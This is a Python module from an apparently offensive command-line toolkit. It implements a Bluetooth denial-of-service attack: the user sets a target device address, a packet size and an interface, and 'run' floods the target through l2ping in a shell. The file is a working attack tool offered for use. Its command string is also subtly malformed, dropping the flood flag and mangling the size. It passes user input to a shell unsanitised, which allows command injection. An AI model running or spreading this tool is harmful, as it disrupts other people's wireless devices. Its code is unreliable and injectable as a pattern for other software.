import os
import threading
import time
import subprocess


from colorama import init as colorama_init
from colorama import Fore
from colorama import Style


options = ["ff:ff:ff:ff:ff:ff", "600", "hci0"]

def bluetooth_dos():
	try:
		pmt0 = f"{Fore.GREEN}plv{Fore.BLUE}/bluetooth/ble_dos>{Style.RESET_ALL}"
		cmd = input(pmt0).lower()
		if(cmd[0:12]=='show options'):
			print('\nBluetooth DoS attack options:')
			print('--------------------------------')
			print('TARGET  ===>  ' + options[0] + '  |  Target of the DoS attack')
			print('SIZE  ===>  ' + options[1] + '  |  Size of junk packets to send')
			print('IFACE    ===>  ' + options[2] + '  |  Bluetooth interface to use\n')
		elif(cmd[0:3]=='set'):
			if(cmd[4:10]=='target'):
				options[0] = cmd[11:28]
				print('\nTARGET   ===>  ' + options[0] + '\n')
			elif(cmd[4:8]=='size'):
				options[1] = cmd[9:12]
				print('\nSIZE   ===>  ' + options[1] + '\n')
			elif(cmd[4:9]=='iface'):
				options[2] = cmd[10:24]
				print('\nIFACE   ===>  ' + options[2] + '\n')
			else:
				print('\nUnknown option!\n')	
		elif(cmd[0:3]=='run' or cmd[0:7]=='execute'):
			shell0="l2ping -i %s -s % -f %s" % (options[2], int(options[1]), options[0])
			print(f"{Fore.RED}Bluetooth junk packet DoS attack started!{Style.RESET_ALL}")
			subprocess.Popen(shell0, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
		
		elif(cmd[0:4]=='exit'):
			print("\nGood luck, Plova!\n")
			exit(0)
		else:
			print("\nUnknown command! Available options:\nshow options\nset [option] [value]\nexit\nrun\n")
		bluetooth_dos()
	except(KeyboardInterrupt):
		print("\nExiting module...\n")

